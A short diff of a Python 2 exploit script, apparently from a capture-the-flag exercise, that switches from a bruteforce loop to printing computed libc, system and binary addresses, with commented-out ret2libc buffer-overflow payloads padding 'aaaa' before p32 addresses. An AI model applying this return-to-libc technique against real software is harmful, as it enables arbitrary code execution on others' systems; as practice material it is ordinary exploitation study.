@@ -54,12 +54,11 @@ def bruteforce():
         except:
             print 'continue'
 
-
         # for i in range(0, 256):
-        #    libc = libcaddr()
-        #    print hex(libc)
-        # print hex(systemaddr + libc)
-        # print hex(binaddr + libc)
-bruteforce()
+libc = libcaddr()
+print hex(libc)
+print hex(systemaddr + libc)
+print hex(binaddr + libc)
+# bruteforce()
 #attack('aaaa' * 3)
 #attack('aaaa' * 28 + p32(systemaddr + libc) + 'aaaa' + p32(binaddr + libc))
